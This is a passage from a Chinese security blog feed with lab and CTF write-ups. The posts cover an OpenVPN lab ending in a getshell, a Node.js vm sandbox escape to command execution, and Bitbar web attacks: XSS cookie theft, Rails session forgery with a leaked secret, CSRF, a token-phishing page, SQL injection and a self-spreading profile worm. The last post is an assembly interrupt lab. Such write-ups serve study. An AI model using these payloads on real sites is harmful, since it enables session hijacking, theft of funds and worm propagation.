192.168.1.6(centos) 上配置openvpn服务端，在192.168.1.5(windows) 上连接</p><p>通过 scp 拷贝文件到 192.168.1.6 上</p><p>之后yum install一下</p><pre><code>yum localinstall openvpn-2.4.4-1.el7.x86_64.rpm  easy-rsa-2.2.2-1.el5.noarch.rpm  lz4-1.7.5-2.el7.x86_64.rpm pkcs11-helper-1.11-3.el7.x86_64.rpm</code></pre><p>然后开始配置vpn</p><pre><code>[root@simple openvpn]# cp /usr/share/doc/openvpn-2.4.4/sample/sample-config-files/server.conf /etc/openvpn/[root@simple openvpn]# cd /etc/openvpn/[root@simple openvpn]# lsclient  server  server.conf</code></pre><p>修改配置文件</p><p><img src="/posts/9fa2ed28/clipboard-1590319619430.png" alt></p><p>生成ca</p><p><img src="/posts/9fa2ed28/clipboard-1590319619490.png" alt></p><p>生成服务端证书</p><p><img src="/posts/9fa2ed28/clipboard-1590319619589.png" alt></p><p>开启openvpn</p><p><img src="/posts/9fa2ed28/clipboard-1590319619654.png" alt></p><p>windows配置文件</p><pre><code>-&gt;|############################################### Sample client-side OpenVPN 2.0 config file ## for connecting to multi-client server.     ##                                            ## This configuration can be used by multiple ## clients, however each client should have   ## its own cert and key files.                ##                                            ## On Windows, you might want to rename this  ## file so it has a .ovpn extension           ################################################ Specify that we are a client and that we# will be pulling certain config file directives# from the server.client# Use the same setting as you are using on# the server.# On most systems, the VPN will not function# unless you partially or fully disable# the firewall for the TUN/TAP interface.;dev tapdev tun# Windows needs the TAP-Win32 adapter name# from the Network Connections panel# if you have more than one.  On XP SP2,# you may need to disable the firewall# for the TAP adapter.;dev-node MyTap# Are we connecting to a TCP or# UDP server?  Use the same setting as# on the server.;proto tcpproto udp# The hostname/IP and port of the server.# You can have multiple remote entries# to load balance between the servers.remote 192.168.1.6 1194;remote my-server-2 1194# Choose a random host from the remote# list for load-balancing.  Otherwise# try hosts in the order specified.;remote-random# Keep trying indefinitely to resolve the# host name of the OpenVPN server.  Very useful# on machines which are not permanently connected# to the internet such as laptops.resolv-retry infinite# Most clients don&#39;t need to bind to# a specific local port number.nobind# Downgrade privileges after initialization (non-Windows only);user nobody;group nobody# Try to preserve some state across restarts.persist-keypersist-tun# If you are connecting through an# HTTP proxy to reach the actual OpenVPN# server, put the proxy server/IP and# port number here.  See the man page# if your proxy server requires# authentication.;http-proxy-retry # retry on connection failures;http-proxy [proxy server] [proxy port #]# Wireless networks often produce a lot# of duplicate packets.  Set this flag# to silence duplicate packet warnings.;mute-replay-warnings# SSL/TLS parms.# See the server config file for more# description.  It&#39;s best to use# a separate .crt/.key file pair# for each client.  A single ca# file can be used for all clients.ca ca.crtcert client.crtkey client.key# Verify server certificate by checking# that the certicate has the nsCertType# field set to &quot;server&quot;.  This is an# important precaution to protect against# a potential attack discussed here:#  http://openvpn.net/howto.html#mitm## To use this feature, you will need to generate# your server certificates with the nsCertType# field set to &quot;server&quot;.  The build-key-server# script in the easy-rsa folder will do this.;ns-cert-type server# If a tls-auth key is used on the server# then every client must also have the key.tls-auth ta.key 1# Select a cryptographic cipher.# If the cipher option is used on the server# then you must also specify it here.cipher AES-256-CBC# Enable compression on the VPN link.# Don&#39;t enable this unless it is also# enabled in the server config file.;comp-lzo# Set log file verbosity.verb 3# Silence repeating messagesmute 20</code></pre><p>连接报错，</p><p><img src="/posts/9fa2ed28/clipboard-1590319619815.png" alt></p><blockquote><p>google 知道是时间不同步，手动修改Windows时间正常连接</p></blockquote><p>权限不够</p><p><img src="/posts/9fa2ed28/clipboard-1590319619826.png" alt></p><blockquote><p>管理员身份打开命令行，cd到配置文件目录下，输入 openvpn 配置文件名 即可</p></blockquote><p>无法ping 通</p><p><img src="https://note.youdao.com/yws/public/resource/1fad93d26e758145d0fe5ef5484d707f/xmlnote/880F9FEB76CC451983ACD136DC135B02/2778" alt></p><p>需要修改服务端配置文件</p><p>成功连接后可以访问到 192.168.2.3</p><p><img src="/posts/9fa2ed28/clipboard-1590319620274.png" alt></p><p>弱口令登录 phpmyadmin，得到后台密码 1q2w3e4r</p><p><img src="/posts/9fa2ed28/clipboard-1590319620440.png" alt></p><p>将工具拷贝到 192.168.1.5 中</p><p><img src="/posts/9fa2ed28/clipboard-1590319620712.png" alt></p><p><img src="/posts/9fa2ed28/clipboard-1590319620757.png" alt></p><p>getshell</p><p><img src="/posts/9fa2ed28/clipboard-1590319620817.png" alt></p><p>最后得到key</p><p><img src="/posts/9fa2ed28/clipboard-1590319621019.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;实验拓扑图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/9fa2ed28/clipboard.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;任务1&quot;&gt;&lt;a href=&quot;#任务1&quot; class=&quot;headerlink&quot; title=&quot;任务1&quot;&gt;&lt;/a&gt;任务1&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>js沙箱逃逸</title>
    <link href="http://prontosil.com/posts/55470809/"/>
    <id>http://prontosil.com/posts/55470809/</id>
    <published>2020-05-10T12:34:59.000Z</published>
    <updated>2020-05-11T10:04:19.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h2><pre><code class="js">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`let a = &quot;welcome!&quot;;a;`);console.log(xyz);</code></pre><p>打印出</p><pre><code>welcome</code></pre><p>如果换成</p><pre><code class="js">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`process`);console.log(xyz);</code></pre><p>结果：</p><p><img src="/posts/55470809/1589114675198.png" alt></p><p>因为 <code>process</code> 是没有定义的</p><p>但是我们可以通过这样来获取到系统的环境变量</p><pre><code class="js">const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#39;return this.process.env&#39;)()`);console.log(env);</code></pre><p>因为 <code>this</code> 指向了一个外部的对象，<code>this.conatructor</code> 指向的就是 Object 对象的 <code>Constructor</code> ， 而 <code>object constructor</code> 返回的就是 <code>Function constructor</code></p><p>完成 RCE</p><pre><code class="js">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;dir&#39;).toString()`);console.log(xyz);</code></pre><p><img src="/posts/55470809/1589114918266.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;vm沙箱逃逸&quot;&gt;&lt;a href=&quot;#vm沙箱逃逸&quot; class=&quot;headerlink&quot; title=&quot;vm沙箱逃逸&quot;&gt;&lt;/a&gt;vm沙箱逃逸&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;&amp;quot;use strict&amp;quot;;
const vm = 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="js" scheme="http://prontosil.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>bitbar实验</title>
    <link href="http://prontosil.com/posts/bc703cb4/"/>
    <id>http://prontosil.com/posts/bc703cb4/</id>
    <published>2020-05-03T14:50:23.000Z</published>
    <updated>2020-05-17T02:49:58.876Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Attack-1-Warm-up-exercise-Cookie-Theft"><a href="#Attack-1-Warm-up-exercise-Cookie-Theft" class="headerlink" title="Attack  1: Warm-up exercise: Cookie Theft"></a>Attack  1: Warm-up exercise: Cookie Theft</h2><p>根据路由</p><pre><code class="ruby">  get &#39;profile&#39; =&gt; &#39;user#view_profile&#39;</code></pre><p>定位到函数</p><pre><code class="ruby">  def view_profile    @username = params[:username]    @user = User.find_by_username(@username)    if not @user      if @username and @username != &quot;&quot;        @error = &quot;User #{@username} not found&quot;      elsif logged_in?        @user = @logged_in_user      end    end    render :profile  end</code></pre><p>可以看到，输入的 <code>username</code> 被直接给打印出来，那么自然就存在XSS漏洞了。</p><p>payload</p><pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;(new Image()).src=&quot;http://localhost:3000/steal_cookie?cookie=&quot;+document.cookie&lt;/script&gt;</code></pre><p>或者使用 xmlhttprequest 发送</p><pre><code class="html">&lt;script type=&quot;text/javascript&quot;&gt;var x = new XMLHttpRequest();x.open(&quot;GET&quot;, &quot;http://localhost:3000/steal_cookie?cookie=&quot;+(document.cookie));x.send()&lt;/script&gt;</code></pre><p><img src="/posts/bc703cb4/1588517915811.png" alt></p><h2 id="Attack-2-Session-hijacking-with-Cookies"><a href="#Attack-2-Session-hijacking-with-Cookies" class="headerlink" title="Attack 2: Session hijacking with Cookies"></a>Attack 2: Session hijacking with Cookies</h2><p><a href="https://ruby-china.org/topics/34235" target="_blank" rel="noopener">参考这篇文章</a></p><p><img src="/posts/bc703cb4/931ecdae-5601-4395-bc2c-d1e49b2ba8e6.png!large" alt></p><blockquote><p>上图说明了原始的 Session 对象 <strong>Session Data</strong> 是如何最终生成 Cookie 的</p></blockquote><p>原来的加密过程：</p><ol><li>序列化</li><li>填充，aes-cbc加密，结果用base64编码</li><li>hmac-sha1签名</li><li>将加密的数据和签名通过 <code>--</code> 连接</li></ol><p>但是意外地发现，bitbar的cookie并没有aes加密，可以通过</p><ol><li>base64解码</li><li>反序列化</li></ol><p>得到原始信息，那么这么一来，就只需要绕过验签这一个障碍了</p><p>在 <code>config/initializers/secret_token.rb</code> 中</p><pre><code class="ruby"># Be sure to restart your server when you modify this file.# Your secret key is used for verifying the integrity of signed cookies.# If you change this key, all old signed cookies will become invalid!# Make sure the secret is at least 30 characters and all random,# no regular words or you&#39;ll be exposed to dictionary attacks.# You can use `rake secret` to generate a secure secret key.# Make sure your secret_key_base is kept private# if you&#39;re sharing your code publicly.Bitbar::Application.config.secret_token = &#39;0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08&#39;</code></pre><p>这就是hmac-sha1的加解密密钥</p><p>ok，到此为止我们就能伪造数据了</p><ol><li>attacke用户登陆，获取到当前的cookie</li><li>修改cookie值</li></ol><p>这里需要用到 <code>mechanize</code> 这个包，安装</p><pre><code>gem install mechanize</code></pre><p>模拟登陆实现</p><pre><code class="ruby">agent = Mechanize.new #实例化对象url = &quot;http://localhost:3000/login&quot;page = agent.get(url) # 获得网页form = page.forms.first # 第一个表单form[&#39;username&#39;] = form[&#39;password&#39;] = &#39;attacker&#39; # 填写表单，用户名和密码都是attackeragent.submit form # 提交表单</code></pre><p>这就相当于登陆了，然后我们获得cookie信息</p><pre><code class="ruby">cookie = agent.cookie_jar.jar[&#39;localhost&#39;][&#39;/&#39;][SESSION].to_s.sub(&quot;#{SESSION}=&quot;, &#39;&#39;)cookie_value, cookie_signature = cookie.split(&#39;--&#39;)raw_session = Base64.decode64(cookie_value)session = Marshal.load(raw_session)</code></pre><p>session如下:</p><pre><code class="json">{&quot;session_id&quot;=&gt;&quot;66ef9a22ca26e27ea4d3018b12c07999&quot;, &quot;token&quot;=&gt;&quot;q2VXDRnMskkf-69Gu2PiTg&quot;, &quot;logged_in_id&quot;=&gt;4}</code></pre><p>很明显， 我们只需要修改 <code>logged_in_id</code> 为1即可</p><pre><code class="ruby">session[&#39;logged_in_id&#39;] = 1cookie_value = Base64.encode64(Marshal.dump(session)).split.join # get rid of newlinescookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)cookie_full = &quot;#{SESSION}=#{cookie_value}--#{cookie_signature}&quot;puts &quot;document.cookie=&#39;#{cookie_full}&#39;;&quot;</code></pre><p>这时候得到的session</p><pre><code>document.cookie=&#39;_bitbar_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFVEkiJTY2ZWY5YTIyY2EyNmUyN2VhNGQzMDE4YjEyYzA3OTk5BjsAVEkiCnRva2VuBjsARkkiG3EyVlhEUm5Nc2trZi02OUd1MlBpVGcGOwBGSSIRbG9nZ2VkX2luX2lkBjsARmkG--935e2e8f9f3d190f2ffccdf9cafd9e4480319054&#39;;</code></pre><p>然后再发送数据，比如访问 <code>http://localhost:3000/profile</code></p><pre><code class="ruby">url = URI(&#39;http://localhost:3000/profile&#39;)http = Net::HTTP.new(url.host, url.port)header = {&#39;Cookie&#39;:cookie_full}response = http.get(url,header)puts response.body</code></pre><p>此时我们就能看到，</p><p><img src="/posts/bc703cb4/1588571397765.png" alt></p><p>浏览器已经认为我们是 <code>user1</code> 了</p><p>完整代码</p><pre><code class="ruby">require &#39;mechanize&#39;require &#39;net/http&#39;SESSION = &#39;_bitbar_session&#39;RAILS_SECRET = &#39;0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08&#39;agent = Mechanize.newurl = &quot;http://localhost:3000/login&quot;page = agent.get(url)form = page.forms.firstform[&#39;username&#39;] = form[&#39;password&#39;] = &#39;attacker&#39;agent.submit formcookie = agent.cookie_jar.jar[&#39;localhost&#39;][&#39;/&#39;][SESSION].to_s.sub(&quot;#{SESSION}=&quot;, &#39;&#39;)cookie_value, cookie_signature = cookie.split(&#39;--&#39;)raw_session = Base64.decode64(cookie_value)session = Marshal.load(raw_session)puts sessionsession[&#39;logged_in_id&#39;] = 1cookie_value = Base64.encode64(Marshal.dump(session)).split.join # get rid of newlinescookie_signature = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, RAILS_SECRET, cookie_value)cookie_full = &quot;#{SESSION}=#{cookie_value}--#{cookie_signature}&quot;url = URI(&#39;http://localhost:3000/profile&#39;)http = Net::HTTP.new(url.host, url.port)header = {&#39;Cookie&#39;:cookie_full}response = http.get(url,header)puts response.body</code></pre><h2 id="Attack-3-Cross-site-Request-Forgery"><a href="#Attack-3-Cross-site-Request-Forgery" class="headerlink" title="Attack 3: Cross-site Request Forgery"></a>Attack 3: Cross-site Request Forgery</h2><p>分析，登陆 user1,向attacker转帐，抓到的数据包如下</p><p><img src="/posts/bc703cb4/1588573100136.png" alt></p><p>可见，只需要构造一个表单自动提交即可</p><p><code>b.html</code> 内容如下</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;http://localhost:3000/post_transfer&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot; id=&quot;pay&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;destination_username&quot; value=&quot;attacker&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;quantity&quot; value=10&gt;    &lt;/form&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        function validate(){            document.getElementById(&quot;pay&quot;).submit();        }        window.load = validate();        setTimeout(function(){window.location = &quot;http://baidu.com&quot;;}, 0.1);        &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>表单的字段都是隐藏的，并且值都是给定的，之后通过</p><pre><code class="js">document.getElementById(&quot;pay&quot;).submit();</code></pre><p>实现自动提交</p><p>最后</p><pre><code class="js">setTimeout(function(){window.location = &quot;http://baidu.com&quot;;}, 0.1);</code></pre><p>0.1s 后跳转到百度首页</p><p>也可以使用 <code>xmlhttprequest</code> ，一样的思路</p><pre><code class="html">&lt;html&gt;  &lt;body&gt;    &lt;script&gt;      var request = new XMLHttpRequest();      request.open(&quot;POST&quot;, &quot;http://localhost:3000/post_transfer&quot;);      request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);      request.withCredentials = true;      try {        request.send(&quot;quantity=10&amp;destination_username=attacker&quot;);      } catch (err) {        //      } finally {        window.location = &quot;http://baidu.com/&quot;;      }    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="Attack-4-Cross-site-request-forgery-with-user-assistance"><a href="#Attack-4-Cross-site-request-forgery-with-user-assistance" class="headerlink" title="Attack 4: Cross-site request forgery with user assistance"></a>Attack 4: Cross-site request forgery with user assistance</h2><p>由于 <code>http://localhost:3000/super_secure_transfer</code> 转账的时候，表单带上了一个随机token，所以没办法通过 <code>CSRF</code> 来转帐，只能通过钓鱼的办法，欺骗用户输入自己的 <code>Super Secret Token</code>,这样我们就能绕过服务器的校验了</p><p><code>bp2.html</code> 可以使用上一个的代码</p><p><code>bp.html</code></p><pre><code class="html">&lt;html&gt;  &lt;head&gt;    &lt;title&gt;23333&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;style type=&quot;text/css&quot;&gt;      iframe {      width: 100%;      height: 100%;      border: none;      }    &lt;/style&gt;    &lt;script&gt;&lt;/script&gt;    &lt;iframe src=&quot;bp2.html&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p><code>bp2.html</code></p><pre><code class="html">&lt;p&gt;请输入 super_secure_post_transfer 页面下的 Super Secret Token 来证明你不是机器人&lt;/p&gt;&lt;input id=&quot;token&quot; type=&quot;text&quot; placeholder=&quot;Captcha&quot;&gt;&lt;button onClick=&quot;gotEm()&quot;&gt;Confirm&lt;/button&gt;&lt;script&gt;function gotEm() {  var token = document.getElementById(&quot;token&quot;).value;  var request = new XMLHttpRequest();  request.open(&quot;POST&quot;, &quot;http://localhost:3000/super_secure_post_transfer&quot;, false);  request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);  request.withCredentials = true;  try {    request.send(&quot;quantity=10&amp;destination_username=attacker&amp;tokeninput=&quot; + token);  } catch (err) {    // Do nothing on inevitable XSS error  } finally {    window.top.location = &quot;http://baidu.com&quot;;  }}&lt;/script&gt;</code></pre><h2 id="Attack-5-Little-Bobby-Tables-aka-SQL-Injection"><a href="#Attack-5-Little-Bobby-Tables-aka-SQL-Injection" class="headerlink" title="Attack 5: Little Bobby Tables (aka SQL Injection)"></a>Attack 5: Little Bobby Tables (aka SQL Injection)</h2><p>删除用户的逻辑如下</p><pre><code class="ruby">  def post_delete_user    if not logged_in?      render &quot;main/must_login&quot;      return    end    @username = @logged_in_user.username    User.destroy_all(&quot;username = &#39;#{@username}&#39;&quot;)    reset_session    @logged_in_user = nil    render &quot;user/delete_user_success&quot;  end</code></pre><p>可以看到输入的用户名没有经过任何的过滤直接拼接到了SQL语句中，我们看到后台执行的SQL语句</p><p><img src="/posts/bc703cb4/1589676140899.png" alt></p><p>如果我们的用户名中含有user3即可将user3删除</p><p>那么如果我们注册用户</p><pre><code>user3&#39; or username GLOB &#39;user3?*</code></pre><p>拼接出来的SQL语句必然是</p><pre><code>delete from users where username = user3 or username GLOB &#39;user3?*&#39;</code></pre><p>登陆</p><p><img src="/posts/bc703cb4/1589676748910.png" alt></p><p>删除</p><p><img src="/posts/bc703cb4/1589676771789.png" alt></p><p>此时可以看到后台执行的SQL语句</p><p><img src="/posts/bc703cb4/1589676794562.png" alt></p><h2 id="Attack-6-Profile-Worm"><a href="#Attack-6-Profile-Worm" class="headerlink" title="Attack 6: Profile Worm"></a>Attack 6: Profile Worm</h2><p>问题出在渲染用户的profile上面</p><p><code>profile.html.erb</code> 中，渲染用户的 <code>profile</code> 代码如下</p><pre><code class="html">    &lt;% if @user.profile and @user.profile != &quot;&quot; %&gt;        &lt;div id=&quot;profile&quot;&gt;&lt;%= sanitize_profile(@user.profile) %&gt;&lt;/div&gt;    &lt;% end %&gt;</code></pre><p>调用了函数 <code>sanitize_profile</code></p><pre><code class="ruby">  def sanitize_profile(profile)    return sanitize(profile, tags: %w(a br b h1 h2 h3 h4 i img li ol p strong table tr td th u ul em span), attributes: %w(id class href colspan rowspan src align valign))  end</code></pre><p>其中 <code>santitize</code> 函数，通过 <code>tags</code> 和 <code>attributes</code> 可以指定允许的标签和属性白名单。</p><p>然而属性中出现了 <code>href</code>,这意味着我们可以使用JavaScript伪协议来XSS</p><p>参考： <a href="https://ruby-china.org/topics/28760" target="_blank" rel="noopener">https://ruby-china.org/topics/28760</a></p><p>比如</p><pre><code class="html">&lt;strong id=&quot;bitbar_count&quot; class=&quot;javascript:alert(1)&quot;&gt;&lt;/strong&gt;</code></pre><p>更新自己的 <code>profile</code> 时，查看自己的profile，即可弹窗</p><p><img src="/posts/bc703cb4/1589677835296.png" alt></p><p>如果有用户浏览当前的profile，那么将会发生两个操作</p><ol><li>转账操作</li><li>更新用户的profile</li></ol><p>转账操作的代码如下</p><pre><code class="js">var request = new XMLHttpRequest();request.open(&quot;POST&quot;, &quot;http://localhost:3000/post_transfer&quot;);request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);request.withCredentials = true;try {    request.send(&quot;quantity=1&amp;destination_username=attacker&quot;);} catch (err) {//} finally {    //xxxx 带执行的操作}</code></pre><p>转帐完成之后，我们需要立即更新当前浏览用户的 <code>profile</code></p><p>设置 <code>profile</code> 的数据包如下</p><p><img src="/posts/bc703cb4/1589678078348.png" alt></p><p>只需要向路由 <code>/set_profile</code> 发送请求即可</p><pre><code class="js">request = new XMLHttpRequest();request.open(&quot;POST&quot;, &quot;http://localhost:3000/set_profile&quot;, true);request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);request.withCredentials = true;request.send(&quot;new_profile=&quot;.concat(escape(document.getElementById(&#39;hax-wrap&#39;).outerHTML)));</code></pre><p>遇到的问题：</p><ol><li>发送的数据含有html转移后的 &amp; 符号。如图</li></ol><p><img src="/posts/bc703cb4/clipboard.png" alt></p><p>这里我采用的是 <code>String.fromCharCode()</code> 来将其做一次转换</p><ol start="2"><li>字符串拼接只能用 <code>concat</code> 而不能用 <code>+</code> ，因为  <code>+</code> 号在 html 中是空格的意思</li></ol><p>最后的代码</p><pre><code class="html">&lt;span id=&quot;wrap&quot;&gt;&lt;span id=&quot;bitbar_count&quot; class=&quot;eval(document[&#39;getElementById&#39;](&#39;pxy&#39;)[&#39;innerHTML&#39;])&quot;&gt;&lt;/span&gt;&lt;span id=&quot;pxy&quot;&gt;document.getElementById(&#39;pxy&#39;).style.display = &quot;none&quot;;setTimeout(function(){    var request = new XMLHttpRequest();    request.open(&quot;POST&quot;, &quot;http://localhost:3000/post_transfer&quot;);    request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);    request.withCredentials = true;    try {        request.send(&quot;quantity=1&quot;.concat(String.fromCharCode(38)).concat(&quot;destination_username=attacker&quot;));    } catch (err) {    //    } finally {        request = new XMLHttpRequest();        request.open(&quot;POST&quot;, &quot;http://localhost:3000/set_profile&quot;, true);        request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);        request.withCredentials = true;        request.send(&quot;new_profile=&quot;.concat(escape(document.getElementById(&#39;wrap&#39;).outerHTML)));    }}, 0);10;&lt;/span&gt;&lt;p&gt;233333&lt;/p&gt;&lt;/span&gt;</code></pre><p>ps: 也可以用 js 动态创建 form表单的方式，但是这样页面是会跳转的，无法满足</p><blockquote><p>在转账和profile的赋值过程中，浏览器的地址栏需要始终停留在<a href="http://localhost:3000/profile?username=x" target="_blank" rel="noopener">http://localhost:3000/profile?username=x</a> ，其中x是profile被浏览的用户名。</p></blockquote><p>附上js动态创建form表单的代码</p><pre><code class="js">&lt;span id=&quot;wrap&quot;&gt;&lt;strong id=&quot;bitbar_count&quot; class=&quot;eval((document[&#39;getElementById&#39;](&#39;pxy&#39;).innerHTML))&quot;&gt;&lt;/strong&gt;&lt;span id=&quot;pxy&quot;&gt;document.getElementById(&#39;pxy&#39;).style.display = &quot;none&quot;;function makeForm(){    var form = document.createElement(&quot;form&quot;);    form.id = &quot;pay&quot;;    document.body.appendChild(form);    var input = document.createElement(&quot;input&quot;);    input.type = &quot;text&quot;;    input.name =  &quot;destination_username&quot;;    input.value = &quot;attacker&quot;;    input.type = &#39;hidden&#39;;    form.appendChild(input);    var input2 = document.createElement(&quot;input&quot;);    input2.type = &quot;hidden&quot;;    input2.name = &quot;quantity&quot;;    input2.value = 10    form.appendChild(input2);    form.action = &quot;http://localhost:3000/post_transfer&quot;;    form.method = &quot;POST&quot;;    form.enctype = &quot;application/x-www-form-urlencode&quot;;    form.submit();}makeForm();request = new XMLHttpRequest();request.open(&quot;POST&quot;, &quot;http://localhost:3000/set_profile&quot;, true);request.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);request.withCredentials = true;request.send(&quot;new_profile=&quot;.concat(escape(document.getElementById(&#39;wrap&#39;).outerHTML)));&lt;/span&gt;&lt;/span&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Attack-1-Warm-up-exercise-Cookie-Theft&quot;&gt;&lt;a href=&quot;#Attack-1-Warm-up-exercise-Cookie-Theft&quot; class=&quot;headerlink&quot; title=&quot;Attack  1: Warm-
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="实验" scheme="http://prontosil.com/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土八</title>
    <link href="http://prontosil.com/posts/90d750b6/"/>
    <id>http://prontosil.com/posts/90d750b6/</id>
    <published>2020-04-29T03:03:16.000Z</published>
    <updated>2020-04-29T03:38:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="中断处理的流程-牢记"><a href="#中断处理的流程-牢记" class="headerlink" title="中断处理的流程(牢记)"></a>中断处理的流程(牢记)</h2><p><img src="/posts/90d750b6/clipboard.png" alt></p><p>关于第三步</p><p>为什么要设置第8位 TF？</p><p>这就涉及到debug程序的原理：</p><blockquote><p>debug的原理，通过设置 TF 为1，引发单步中断去执行debug准备好的中断代码</p><p><img src="/posts/90d750b6/1588129690345.png" alt></p></blockquote><p>但是这样会有问题，在处理中断的时候是不能去触发单步中断的，所以CPU要提前设置TF为0</p><p>中断过程具体的操作</p><p><img src="/posts/90d750b6/1588129813844.png" alt></p><h2 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h2><p>代码如下：</p><pre><code class="asm">assume cs:codecode segmentstart:    mov ax,cs    mov ds,ax    mov si,offset do0    mov ax,0    mov es,ax    mov di,200H    mov cx,offset do0end-offset do0    rep movsb    mov ax,0    mov es,ax    mov word ptr es:[0],200H    mov word ptr es:[2],0    mov ax, 1000h    mov bh, 1    div bh    mov ax,4C00H    int 21Hdo0:    jmp short do0start    db &quot;divide error!&quot;do0start:    mov ax,cs    mov ds,ax    mov si,202H    mov ax,0B800H    mov es,ax    mov di,12*160+33*2;这里要注意一下，不能因为字符串长度为13，为了居中输出就设置成12*160+67，会出现意想不到的情况    mov cx,13    s:    mov al,[si]    mov es:[di],al    inc si    add di,2    loop s    mov ax,4C00H    int 21Hdo0end:nopcode endsend start</code></pre><p>通过 <code>offset</code> 获得偏移地址</p><p>通过 <code>rep movsb</code> 来拷贝 do0 程序</p><blockquote><p>这里特别注意，do0 要使用的字符串必须存储在 do0 子程序中，并且需要手动计算一下字符串的位置</p></blockquote><p>当然最后还需要来触发这个中断</p><pre><code class="asm">    mov ax, 1000h    mov bh, 1    div bh</code></pre><p>如果直接存放原来data中的位置</p><pre><code class="asm">assume cs:codedata segmentdb &quot;overflow!&quot;data endscode segmentstart:    mov ax,cs    mov ds,ax    mov si,offset do0    mov ax,0    mov es,ax    mov di,200H    mov cx,offset do0end-offset do0    rep movsb    mov ax,0    mov es,ax    mov word ptr es:[0],200H    mov word ptr es:[2],0    mov ax, 1000h    mov bh, 1    div bh    mov ax,4C00H    int 21Hdo0:    mov ax,data    mov ds,ax    mov si,0    mov ax,0B800H    mov es,ax    mov di,12*160+33*2    mov cx,13    s:    mov al,[si]    mov es:[di],al    inc si    add di,2    loop s    mov ax,4C00H    int 21Hdo0end:nopcode endsend start</code></pre><p>也是可以执行的</p><p><img src="/posts/90d750b6/1588131368497.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;中断处理的流程-牢记&quot;&gt;&lt;a href=&quot;#中断处理的流程-牢记&quot; class=&quot;headerlink&quot; title=&quot;中断处理的流程(牢记)&quot;&gt;&lt;/a&gt;中断处理的流程(牢记)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/posts/90d750b6/clipboard.
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>企业环境渗透一</title>
    <link href="http://prontosil.com/posts/c7cfd527/"/>
    <id>http://prontosil.com/posts/c7cfd527/</id>
    <published>2020-04-29T01:06:42.000Z</published>
    <updated>2020-04-29T01:09:32.125Z</updated>
    
